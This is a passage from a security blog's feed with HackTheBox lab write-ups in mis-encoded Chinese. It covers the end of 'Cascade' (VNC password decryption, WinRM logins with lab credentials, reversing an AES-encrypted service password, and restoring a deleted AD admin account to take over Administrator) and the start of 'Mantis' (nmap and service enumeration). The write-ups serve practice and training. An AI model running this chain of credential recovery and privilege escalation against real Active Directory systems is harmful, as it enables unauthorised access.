alt="image-20240722164021239"></p><p><code>&quot;Password&quot;=hex:6b,cf,2a,4b,6e,5a,ca,0f</code></p><p>æ­£å¸¸çš„<code>hex</code>è§£å¯†æ˜¯è§£ä¸å‡ºæ¥çš„ï¼Œå»ç½‘ä¸Šæ‰¾ä¸€ä¸‹<code>vnc</code>è§£å¯†çš„å·¥å…·</p><p><a href="https://github.com/jeroennijhof/vncpwd">vncpwd</a></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722184121545-909779804.png" alt="image-20240722184058650"></p><p>è§£å¯†å®Œæˆï¼Œå‘ç°æ˜æ–‡å¯†ç <code>sT333ve2</code>ï¼ŒçŒœæµ‹æ˜¯<code>s.smith</code>ç”¨æˆ·çš„</p><h2 id="ä¸´æ—¶è´¦æˆ·TempAdmin"><a href="#ä¸´æ—¶è´¦æˆ·TempAdmin" class="headerlink" title="ä¸´æ—¶è´¦æˆ·TempAdmin"></a>ä¸´æ—¶è´¦æˆ·TempAdmin</h2><p>åœ¨<code>/Data/IT/Email Archives/</code>ç›®å½•ä¸‹æ‰¾åˆ°ä¸ªæ–‡ä»¶<code>Meeting_Notes_June_2018.html</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722185451609-2123011953.png" alt="image-20240722185428846"></p><p>ä»é‚®ä»¶ä¸­ï¼Œå¯ä»¥è·å–åˆ°çš„æœ‰æ•ˆä¿¡æ¯æ˜¯ï¼Œç¯å¢ƒè¿ç§»æ—¶ä¼šä½¿ç”¨ä¸´æ—¶è´¦æˆ·<code>TempAdmin</code>ï¼Œå¹¶ä¸”å¯†ç ä¸å¸¸è§„<code>admin</code>å¯†ç ç›¸åŒ,å½“ç¯å¢ƒè¿ç§»ç»“æŸåä¼šåˆ é™¤ä¸´æ—¶è´¦æˆ·ã€‚</p><p>åœ¨<code>/Data/IT/Logs/Ark AD Recycle Bin</code>ç›®å½•ä¸‹å‘ç°<code>ArkAdRecycleBin.log</code>æ—¥å¿—æ–‡ä»¶</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240723104039743-140522147.png" alt="image-20240723104034284"></p><p>ä»æ—¥å¿—ä¸­æˆ‘ä»¬å‘ç°<code>TempAdmin</code>å¸æˆ·å·²ç§»è‡³å›æ”¶ç«™</p><h1 id="æ¨ªå‘ç§»åŠ¨"><a href="#æ¨ªå‘ç§»åŠ¨" class="headerlink" title="æ¨ªå‘ç§»åŠ¨"></a>æ¨ªå‘ç§»åŠ¨</h1><h2 id="ç™»å½•s-smithç”¨æˆ·"><a href="#ç™»å½•s-smithç”¨æˆ·" class="headerlink" title="ç™»å½•s.smithç”¨æˆ·"></a>ç™»å½•s.smithç”¨æˆ·</h2><p>å…ˆåˆ©ç”¨<code>crackmapexec</code>æµ‹è¯•èƒ½å¦é€šè¿‡<code>evil-winrm</code>ç™»å½•<code>s.smith</code>ç”¨æˆ·</p><p><code>crackmapexec winrm 10.10.10.182 -u s.smith -p sT333ve2</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722190053646-898096504.png" alt="image-20240722190031059"></p><p>æµ‹è¯•å‘ç°çš„ç¡®å¯ä»¥ä½¿ç”¨å¯†ç ï¼š<code>sT333ve2</code>é€šè¿‡<code>winRM</code>ç”¨<code>s.smith</code>è´¦å·è¿›è¡Œè¿œç¨‹ç™»å½•</p><p><code>evil-winrm -u s.smith -p &#39;sT333ve2&#39; -i 10.10.10.182</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722191054897-647149480.png" alt="image-20240722191053738"></p><p>æˆåŠŸç™»å½•</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722191134005-826162699.png" alt="image-20240722191133301"></p><p>åœ¨<code>s.smith</code>çš„<code>Desktop</code>ç›®å½•æ‰¾åˆ°<code>user.txt</code></p><p>åŒæ—¶å‘ç°ä¸€ä¸ªå¯ç–‘çš„è½¯é“¾æ¥æ–‡ä»¶<code>WinDirStat.lnk</code></p><p>æŸ¥çœ‹ä¸€ä¸‹è¯¥ç”¨æˆ·æ‰€åœ¨ç»„ä¿¡æ¯</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722192914972-506642969.png" alt="image-20240722192913858"></p><p>å‘ç°è¯¥ç”¨æˆ·å¹¶ä¸åœ¨æƒé™ç»„ä¸­ï¼Œä½†æ˜¯å‘ç°è¯¥ç”¨æˆ·å±äº<code>Audit Share</code>ç»„ï¼Œæ¥ä¸‹æ¥å°±å¯ä»¥è®¿é—®<code>Audit</code>ç›®å½•ä¸‹çš„æ–‡ä»¶è¿›è¡ŒæŸ¥çœ‹</p><h2 id="s-smith-SMB"><a href="#s-smith-SMB" class="headerlink" title="s.smith-SMB"></a>s.smith-SMB</h2><p>è®¿é—®<code>Audit</code>ç›®å½•</p><p><code>smbclient \\\\10.10.10.182\\Audit$ -U s.smith</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722194201797-1094652226.png" alt="image-20240722194200709"></p><p>ç™»é™†æˆåŠŸï¼Œè¿˜æ˜¯è€åŠæ³•ï¼Œå°†æ–‡ä»¶ä¸‹è½½åˆ°æœ¬åœ°æŸ¥çœ‹</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">smb: \&gt; mask <span class="string">&quot;&quot;</span></span><br><span class="line">smb: \&gt; recurse ON <span class="comment">#é»˜è®¤æƒ…å†µä¸‹é€’å½’é€‰é¡¹æ˜¯OFF,åœ¨ smb æç¤ºç¬¦ä¸‹è¾“å…¥ recurse ONå‘½ä»¤ä¼šå°†æ­¤é€‰é¡¹åˆ‡æ¢ä¸ºON</span></span><br><span class="line">smb: \&gt; prompt OFF <span class="comment">#é»˜è®¤æƒ…å†µä¸‹è¯¢é—®æ˜¯å¦ä¸‹è½½é€‰é¡¹æ˜¯ON,åœ¨ smb æç¤ºç¬¦ä¸‹è¾“å…¥prompt OFFå‘½ä»¤ä¼šå°†æ­¤é€‰é¡¹åˆ‡æ¢ä¸ºOFF</span></span><br><span class="line">smb: \&gt; mget *<span class="comment">#æ­¤æ—¶å¯ä»¥åœ¨ä¸è¯¢é—®çš„æƒ…å†µä¸‹é€’å½’ä¸‹è½½dataç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722194913997-1071312517.png" alt="image-20240722194912751"></p><p>ä¸‹è½½å®Œæˆ</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722195141176-321662553.png" alt="image-20240722195139213"></p><h2 id="Audit-db"><a href="#Audit-db" class="headerlink" title="Audit.db"></a>Audit.db</h2><p>é¦–å…ˆå°±æ˜¯åœ¨<code>DB</code>ç›®å½•ä¸‹æ‰¾åˆ°æ•°æ®åº“ï¼Œè¯•è¯•èƒ½ä¸èƒ½è·å–ä¸€äº›æœ‰ç”¨çš„ä¿¡æ¯ </p><p><code>sqlite3 Audit.db</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722200725849-1056528410.png" alt="image-20240722200724571"></p><p>åªèƒ½ä»<code>Ldap</code>è¡¨ä¸­æ‰¾åˆ°<code>Arksvc</code>ç”¨æˆ·åï¼Œå¯†ç ç ´è§£ä¸äº†</p><h2 id="CascAudit-exeæ–‡ä»¶åˆ†æ"><a href="#CascAudit-exeæ–‡ä»¶åˆ†æ" class="headerlink" title="CascAudit.exeæ–‡ä»¶åˆ†æ"></a>CascAudit.exeæ–‡ä»¶åˆ†æ</h2><p>ç»§ç»­çœ‹<code>Audit</code>ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œå…ˆçœ‹é‚£ä¸ª<code>.bat</code>æ–‡ä»¶</p><p><code>cat RunAudit.bat</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722200948420-1914062784.png" alt="image-20240722200947578"></p><p>å‘ç°<code>CascAudit.exe</code>ä»¥ <code>db</code> æ–‡ä»¶ä½œä¸ºå‚æ•°è¿è¡Œï¼ŒæŸ¥çœ‹ä¸€ä¸‹<code>CascAudit.exe</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722201149933-116365236.png" alt="image-20240722201149317"></p><p>å‘ç°è¿™æ˜¯ä¸€ä¸ª<code>.NET</code>çš„æ–‡ä»¶ï¼Œåˆ©ç”¨å·¥å…·è°ƒè¯•ä¸€ä¸‹</p><p><a href="https://github.com/dnSpy/dnSpy/releases">dnSpy</a></p><p>æŠŠæ‰€å±æ–‡ä»¶å¤¹<code>dump</code>ä¸‹æ¥ä¸¢è¿›<code>dnspy</code>åŠ¨è°ƒä¸€ä¸‹ï¼ŒæŠŠæ–­ç‚¹æ‰“åœ¨æ–­å¼€æ•°æ®åº“è¿æ¥çš„åœ°æ–¹æƒ³åŠ«æŒä¸€ä¸‹<code>password</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722211926047-1402503370.png" alt="image-20240722211925250"></p><p>ä½†æ˜¯è¿™å—å„¿å¯èƒ½æ˜¯æˆ‘çš„<code>dnspy</code>æœ‰é—®é¢˜ï¼Œä¸€ç›´å¡åœ¨ä¸€ä¸ªæŠ¥é”™ä¸Šäº†</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722211944190-800938387.png" alt="image-20240722211943214"></p><p>ç´¢æ€§ç›´æ¥é€†ï¼ŒæŒ‰ç…§å®ƒçš„é€»è¾‘å»æ‰¾<code>password</code>åŠ å¯†çš„åœ°æ–¹ï¼ŒåŒå‡»è·Ÿè¿›è¿™ä¸ªåŠ å¯†</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722211956255-771745297.png" alt="image-20240722211955684"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722212000049-1187622322.png" alt="image-20240722211959240"></p><p>æ˜æ˜¾çš„<code>AES</code>åŠ å¯†ï¼Œç»™äº†ç§˜é’¥å’Œ<code>iv</code>ç›´æ¥æ‰¾ä¸ªåœ¨çº¿ç½‘ç«™è§£äº†ï¼ˆæ³¨æ„å…ˆç”¨<code>base64</code>è§£ç ï¼‰</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722212036892-763850826.png" alt="image-20240722212036170"></p><p>è¿™æ ·æˆ‘ä»¬å°±æ‹¿åˆ°äº†<code>Arksvc</code>çš„å¯†ç <code>w3lc0meFr31nd</code></p><p>æ‹¿åˆ°ç”¨æˆ·åå¯†ç ï¼Œæµ‹è¯•ä¸€ä¸‹èƒ½ä¸èƒ½<code>winrm</code>ç™»å½•</p><p><code>crackmapexec winrm 10.10.10.182 -u Arksvc -p w3lc0meFr31nd</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722212516783-401250117.png" alt="image-20240722212515703"></p><p>å¯ä»¥ç™»å½•ï¼Œæ‹¿<code>evil-winrm</code>ç™»å½•</p><p><code>evil-winrm -i 10.10.10.182 -u Arksvc -p w3lc0meFr31nd</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240722212621095-1069117083.png" alt="image-20240722212620250"></p><p>ç™»é™†æˆåŠŸ</p><h1 id="AD-Recycle-Binæ»¥ç”¨æƒé™æå‡"><a href="#AD-Recycle-Binæ»¥ç”¨æƒé™æå‡" class="headerlink" title="AD Recycle Binæ»¥ç”¨æƒé™æå‡"></a>AD Recycle Binæ»¥ç”¨æƒé™æå‡</h1><p>å…ˆçœ‹<code>Arksvc</code>ç”¨æˆ·æœ‰æ²¡æœ‰ä»€ä¹ˆå¯ä»¥åˆ©ç”¨çš„æƒé™</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240723100622343-929767262.png" alt="image-20240723100620239"></p><p>å‘ç°è¯¥ç”¨æˆ·å±äº <code>AD Recycle Bin</code> ç»„ä¸‹</p><blockquote><p>è¯¥ç»„æ˜¯ç”¨äºæ¢å¤è¢«åˆ é™¤çš„ç”¨æˆ·ï¼Œç»„ä»¥åŠOUç­‰å¯¹è±¡çš„ï¼Œè¿™äº›å¯¹è±¡åœ¨ <code>AD Recycle Bin</code> ä¸­æ—¶ä¿æŒå…¶æ‰€æœ‰å±æ€§ä¸å˜ï¼Œè¿™ä½¿å¾—å®ƒä»¬å¯ä»¥åœ¨ä»»ä½•æ—¶å€™è¢«æ¢å¤ã€‚</p><p><a href="https://blog.netwrix.com/2021/11/30/active-directory-object-recovery-recycle-bin/">å‚è€ƒé“¾æ¥</a></p></blockquote><p>å‰é¢å·²ç»çŸ¥é“ä¸¤ä¸ªé‡è¦ä¿¡æ¯ï¼Œä¸€ä¸ªæ˜¯ç®¡ç†å‘˜ç”¨æˆ·å’Œ<code>TempAdmin</code>å¯†ç ä¸€è‡´ï¼Œå¦ä¸€ä¸ªæ˜¯TempAdminè¢«ç§»åˆ°äº†å›æ”¶ç«™</p><p>è¿™é‡Œå¯ä»¥ä½¿ç”¨<code>Get-ADObject</code>æšä¸¾<code>AD</code>å›æ”¶ç«™ä¸­çš„å¯¹è±¡ï¼Œå¹¶è¿‡æ»¤å…·æœ‰<code>isDeleted</code>å±æ€§çš„å·²åˆ é™¤å¯¹è±¡å³å¯</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ADObject</span> <span class="literal">-filter</span> <span class="string">&#x27;isDeleted -eq $true -and name -ne &quot;Deleted Objects&quot;&#x27;</span> <span class="literal">-includeDeletedObjects</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240723105119052-1568759036.png" alt="image-20240723105115495"></p><p>å‘ç°æœ€åä¸€æ¡æ•°æ®æ˜¯æˆ‘ä»¬ä¹‹å‰æåˆ°çš„<code>TempAdmin</code>ï¼Œè·å–è¯¥å¸æˆ·çš„æ‰€æœ‰è¯¦ç»†ä¿¡æ¯</p><p><code>Get-ADObject -filter &#123; SAMAccountName -eq &quot;TempAdmin&quot; &#125; -includeDeletedObjects -property *</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240723105313412-659440464.png" alt="image-20240723105310378"></p><p>æ³¨æ„åˆ°å¯†ç å€¼å¾ˆå¯èƒ½æ˜¯<code>base64</code>ç¼–ç ï¼Œè§£ç ä¸€ä¸‹</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240723105357920-613810809.png" alt="image-20240723105356090"></p><p>è·å–<code>TempAdmin</code>çš„æ˜æ–‡å¯†ç ï¼š<code>baCT3r1aN00dles</code></p><p>å› ä¸ºä¹‹å‰æåˆ°è¿‡<code>TempAdmin</code>çš„å¯†ç è·Ÿæ­£å¸¸ç®¡ç†å‘˜å¯†ç ä¸€æ ·ï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥æµ‹è¯•èƒ½å¦ä½¿ç”¨è¿™ä¸ªå¯†ç è¿œç¨‹ç™»é™†<code>Administrator</code></p><p><code>crackmapexec winrm 10.10.10.182 -u Administrator -p baCT3r1aN00dles</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240723105753291-1398855670.png" alt="image-20240723105748085"></p><p>å‘ç°å¯ä»¥ç™»å½•ï¼Œæˆ‘ä»¬ç›´æ¥ç™»å½•<code>Administrator</code></p><p><code>evil-winrm -i 10.10.10.182 -u Administrator -p baCT3r1aN00dles</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240723105924743-1476469846.png" alt="image-20240723105922917"></p><p>ç™»é™†æˆåŠŸï¼</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240723110506025-2001758700.png" alt="image-20240723110503914"></p><p>æœ€ååœ¨<code>Desktop</code>ç›®å½•æ‰¾åˆ°<code>root.txt</code></p>]]></content>
    
    
    <summary type="html">HackTheBoxç¯‡åŸŸæ¸—é€ç³»åˆ—ä¹‹Cascade</summary>
    
    
    
    <category term="HackTheBox" scheme="https://www.fomal.cc/categories/HackTheBox/"/>
    
    
    <category term="HTB" scheme="https://www.fomal.cc/tags/HTB/"/>
    
    <category term="åŸŸæ¸—é€" scheme="https://www.fomal.cc/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>HTB-Mantis</title>
    <link href="https://www.fomal.cc/posts/662d550f.html"/>
    <id>https://www.fomal.cc/posts/662d550f.html</id>
    <published>2024-07-18T07:11:31.000Z</published>
    <updated>2024-10-06T08:25:20.195Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><blockquote><p>é¶æœºipï¼š10.10.10.52</p><p>æ”»å‡»æœºipï¼š10.10.14.16</p></blockquote><h1 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h1><ul><li>MS14-068æƒé™æå‡</li></ul><h1 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h1><h2 id="nmapæ‰«æ"><a href="#nmapæ‰«æ" class="headerlink" title="nmapæ‰«æ"></a>nmapæ‰«æ</h2><p><code>nmap -sS -sV -sC -p- 10.10.10.52</code></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-18 21:03 CST</span><br><span class="line">Nmap scan report for 10.10.10.52</span><br><span class="line">Host is up (0.41s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE      VERSION</span><br><span class="line">53/tcp    open  domain       Microsoft DNS 6.1.7601 (1DB15CD4) (Windows Server 2008 R2 SP1)</span><br><span class="line">| dns-nsid:</span><br><span class="line">|_  bind.version: Microsoft DNS 6.1.7601 (1DB15CD4)</span><br><span class="line">88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2024-07-18 13:03:51Z)</span><br><span class="line">135/tcp   open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)</span><br><span class="line">445/tcp   open  microsoft-ds Windows Server 2008 R2 Standard 7601 Service Pack 1 microsoft-ds (workgroup: HTB)</span><br><span class="line">464/tcp   open  kpasswd5?</span><br><span class="line">593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  tcpwrapped</span><br><span class="line">1337/tcp  open  http         Microsoft IIS httpd 7.5</span><br><span class="line">|_http-server-header: Microsoft-IIS/7.5</span><br><span class="line">|_http-title: IIS7</span><br><span class="line">1433/tcp  open  ms-sql-s     Microsoft SQL Server 2014 12.00.2000.00; RTM</span><br><span class="line">| ms-sql-ntlm-info:</span><br><span class="line">|   10.10.10.52:1433:</span><br><span class="line">|     Target_Name: HTB</span><br><span class="line">|     NetBIOS_Domain_Name: HTB</span><br><span class="line">|     NetBIOS_Computer_Name: MANTIS</span><br><span class="line">|     DNS_Domain_Name: htb.local</span><br><span class="line">|     DNS_Computer_Name: mantis.htb.local</span><br><span class="line">|     DNS_Tree_Name: htb.local</span><br><span class="line">|_    Product_Version: 6.1.7601</span><br><span class="line">|_ssl-date: 2024-07-18T13:05:06+00:00; -3s from scanner time.</span><br><span class="line">| ms-sql-info:</span><br><span class="line">|   10.10.10.52:1433:</span><br><span class="line">|     Version:</span><br><span class="line">|       name: Microsoft SQL Server 2014 RTM</span><br><span class="line">|       number: 12.00.2000.00</span><br><span class="line">|       Product: Microsoft SQL Server 2014</span><br><span class="line">|       Service pack level: RTM</span><br><span class="line">|       Post-SP patches applied: false</span><br><span class="line">|_    TCP port: 1433</span><br><span class="line">| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback</span><br><span class="line">| Not valid before: 2024-07-18T13:00:53</span><br><span class="line">|_Not valid after:  2054-07-18T13:00:53</span><br><span class="line">3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp  open  tcpwrapped</span><br><span class="line">5722/tcp  open  msrpc        Microsoft Windows RPC</span><br><span class="line">8080/tcp  open  http         Microsoft IIS httpd 7.5</span><br><span class="line">|_http-open-proxy: Proxy might be redirecting requests</span><br><span class="line">|_http-title: Tossed Salad - Blog</span><br><span class="line">|_http-server-header: Microsoft-IIS/7.5</span><br><span class="line">9389/tcp  open  mc-nmf       .NET Message Framing</span><br><span class="line">47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">49152/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49153/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49154/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49155/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49157/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49158/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49167/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49176/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49182/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">50255/tcp open  ms-sql-s     Microsoft SQL Server 2014 12.00.2000.00; RTM</span><br><span class="line">| ms-sql-ntlm-info:</span><br><span class="line">|   10.10.10.52:50255:</span><br><span class="line">|     Target_Name: HTB</span><br><span class="line">|     NetBIOS_Domain_Name: HTB</span><br><span class="line">|     NetBIOS_Computer_Name: MANTIS</span><br><span class="line">|     DNS_Domain_Name: htb.local</span><br><span class="line">|     DNS_Computer_Name: mantis.htb.local</span><br><span class="line">|     DNS_Tree_Name: htb.local</span><br><span class="line">|_    Product_Version: 6.1.7601</span><br><span class="line">| ms-sql-info:</span><br><span class="line">|   10.10.10.52:50255:</span><br><span class="line">|     Version:</span><br><span class="line">|       name: Microsoft SQL Server 2014 RTM</span><br><span class="line">|       number: 12.00.2000.00</span><br><span class="line">|       Product: Microsoft SQL Server 2014</span><br><span class="line">|       Service pack level: RTM</span><br><span class="line">|       Post-SP patches applied: false</span><br><span class="line">|_    TCP port: 50255</span><br><span class="line">| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback</span><br><span class="line">| Not valid before: 2024-07-18T13:00:53</span><br><span class="line">|_Not valid after:  2054-07-18T13:00:53</span><br><span class="line">|_ssl-date: 2024-07-18T13:05:06+00:00; -3s from scanner time.</span><br><span class="line">Service Info: Host: MANTIS; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 34m15s, deviation: 1h30m45s, median: -3s</span><br><span class="line">| smb2-security-mode:</span><br><span class="line">|   2:1:0:</span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">| smb2-time:</span><br><span class="line">|   date: 2024-07-18T13:04:48</span><br><span class="line">|_  start_date: 2024-07-18T13:00:29</span><br><span class="line">| smb-security-mode:</span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: required</span><br><span class="line">| smb-os-discovery:</span><br><span class="line">|   OS: Windows Server 2008 R2 Standard 7601 Service Pack 1 (Windows Server 2008 R2 Standard 6.1)</span><br><span class="line">|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1</span><br><span class="line">|   Computer name: mantis</span><br><span class="line">|   NetBIOS computer name: MANTIS\x00</span><br><span class="line">|   Domain name: htb.local</span><br><span class="line">|   Forest name: htb.local</span><br><span class="line">|   FQDN: mantis.htb.local</span><br><span class="line">|_  System time: 2024-07-18T09:04:52-04:00</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 110.51 seconds</span><br></pre></td></tr></table></figure><p>æœ‰<code>DNS</code>æœåŠ¡ã€<code>Kerberos</code>æœåŠ¡ã€<code>ldap</code>æœåŠ¡ã€<code>SMB</code>æœåŠ¡ã€åœ¨<code>1337</code>ç«¯å£æœ‰<code>http</code>æœåŠ¡ã€åœ¨<code>1433</code> ç«¯å£ä¸Šæœ‰<code>SQL Server</code>æœåŠ¡ï¼ŒåŸŸåä¸º<code>mantis.htb.local</code>ï¼Œ<code>8080</code>ç«¯å£ä¸Šè¿˜æœ‰<code>http</code>æœåŠ¡ï¼Œåº”è¯¥æ˜¯ä¸ª<code>Blog</code>ï¼Œè¿˜æœ‰å…¶ä»–ç­‰å¤šä¸ªç«¯å£ã€‚</p><h2 id="ldap"><a href="#ldap" class="headerlink" title="ldap"></a>ldap</h2><p> <code>ldapsearch -x -H ldap://10.10.10.52:389 -s base -b &quot;&quot; namingcontexts</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240718154746434-704756932.png" alt="image-20240718154737592"></p><p>æ²¡ä»€ä¹ˆé‡è¦çš„ä¿¡æ¯</p><h2 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h2><p><code>smbclient -L //10.10.10.52</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240718154849413-1830849376.png" alt="image-20240718154840864"></p><p><code>smb</code>åŒæ ·æ²¡æœ‰ä»€ä¹ˆé‡è¦ä¿¡æ¯</p><h2 id="rpc"><a href="#rpc" class="headerlink" title="rpc"></a>rpc</h2><p>åˆ©ç”¨RPCè¿œç¨‹è¿‡ç¨‹è°ƒç”¨æšä¸¾ç”¨æˆ·</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240718212255182-877972644.png" alt="image-20240718212246343"></p><p>å…è®¸åŒ¿åè®¿é—®ï¼Œä½†ä¸å…è®¸æ‰§è¡Œå‘½ä»¤ã€‚</p><h2 id="1337ç«¯å£"><a href="#1337ç«¯å£" class="headerlink" title="1337ç«¯å£"></a>1337ç«¯å£</h2><p>æ­¤ç«¯å£æœ‰<code>http</code>æœåŠ¡ï¼Œè®¿é—®ä¸€ä¸‹</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240718212343495-1754620610.png" alt="image-20240718212334561"></p><p>æ˜¯ä¸ªæ­£å¸¸çš„<code>IIS</code>æœåŠ¡ï¼Œå½“å‰é¡µé¢æ²¡å•¥ä¿¡æ¯ï¼Œåˆ©ç”¨<code>gobuster</code>å·¥å…·æ‰«æä¸€ä¸‹</p><p><code>gobuster dir -u http://10.10.10.52:1337 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240719105859519-1199674944.png" 